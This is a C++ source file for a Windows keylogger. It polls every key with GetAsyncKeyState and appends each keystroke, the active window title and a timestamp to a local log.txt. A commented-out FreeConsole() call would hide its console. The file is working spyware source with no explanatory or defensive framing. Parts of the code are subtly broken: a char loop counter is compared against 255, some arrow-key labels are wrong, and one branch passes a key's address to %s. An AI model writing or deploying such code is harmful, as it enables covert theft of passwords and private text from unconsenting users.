#include <iostream>
#include <windows.h>
#include <time.h>

using namespace std;

int logger(int key, char *file)
{
    time_t current_time = time(NULL);
    char *dt = ctime(&current_time);

    HWND hwnd = GetForegroundWindow();
    char windowTitle[256];
    GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
    cout << key << endl;
    // Sleep(10);jin
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    if (key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[SHIFT]", windowTitle, dt);
    else if (key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[RETURN]", windowTitle, dt);
    else if (key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[BACK SPACE]", windowTitle, dt);
    else if (key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[LButton]", windowTitle, dt);
    else if (key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[ESCAPE]", windowTitle, dt);
    else if (key == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[CTRL]", windowTitle, dt);
    else if (key == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[CAPS_LOCK]", windowTitle, dt);
    else if (key == VK_MENU)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[ALT]", windowTitle, dt);
    else if (key == VK_TAB)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[TAB]", windowTitle, dt);
    else if (key == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[LEFT_ARROW]", windowTitle, dt);
    else if (key == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[LEFT_RIGHT]", windowTitle, dt);
    else if (key == VK_UP)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[LEFT_UP]", windowTitle, dt);
    else if (key == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[LEFT_DOWN]", windowTitle, dt);
    else if (key == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", "[SPACE_KEY]", windowTitle, dt);
    else
        fprintf(OUTPUT_FILE, "%s\t{%s}\t%s", &key, windowTitle, dt);
    fclose(OUTPUT_FILE);
    return 0;
}

int main()
{
    // FreeConsole();
    char i;
    while (1)
    {
        // Sleep(10);
        for (i = 8; i <= 255; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                logger(i, "log.txt");
            }
        }
    }
    return 0;
}
